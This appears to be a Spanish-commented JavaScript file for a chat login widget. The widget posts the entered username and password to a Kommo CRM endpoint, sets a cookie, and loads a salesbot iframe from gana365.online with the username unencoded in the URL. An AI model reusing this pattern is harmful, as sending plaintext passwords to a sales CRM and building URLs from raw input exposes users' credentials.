function sendToKommo(username, password) {
    const data = { username, password };
    fetch('/api/kommo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(result => {
        console.log("Datos enviados correctamente:", result);
    })
    .catch(error => {
        console.error("Error al enviar a Kommo:", error);
    });
}

function login() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();
    if (username === "" || password === "") {
        Swal.fire({
            icon: "error",
            title: "Por favor, complete todos los campos",
            confirmButtonText: "OK",
            confirmButtonColor: "#6C63FF",
            iconColor: "#FF3B00",
            customClass: { popup: 'swal2-rounded' }
        });
        return;
    }
    setCookie("chatUser", username, 30);
    sendToKommo(username, password);
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("chatIframe").style.display = "block";
    document.getElementById("chatHeader").style.display = "flex";
    startSalesBot(username);
}

function startSalesBot(username) {
    console.log("Salesbot iniciado para el usuario:", username);
    setTimeout(function() {
        const chatIframe = document.getElementById("chatIframe");
        chatIframe.src = `https://gana365.online/chat?user=${username}`;
        chatIframe.style.display = "block";
    }, 2000);
}

function toggleChat() {
    const chat = document.getElementById("chatBox");
    const button = document.querySelector(".chat-button");
    if (chat.style.display === "block") {
        chat.style.display = "none";
        button.innerHTML = "💬";
    } else {
        chat.style.display = "block";
        setTimeout(() => chat.classList.add("open"), 10);
        button.innerHTML = "✖";
    }
}

function getCookie(name) {
    let cookies = document.cookie.split("; ");
    for (let cookie of cookies) {
        let [key, value] = cookie.split("=");
        if (key === name) return decodeURIComponent(value);
    }
    return "";
}

function setCookie(name, value, days) {
    let date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + date.toUTCString() + "; path=/";
}
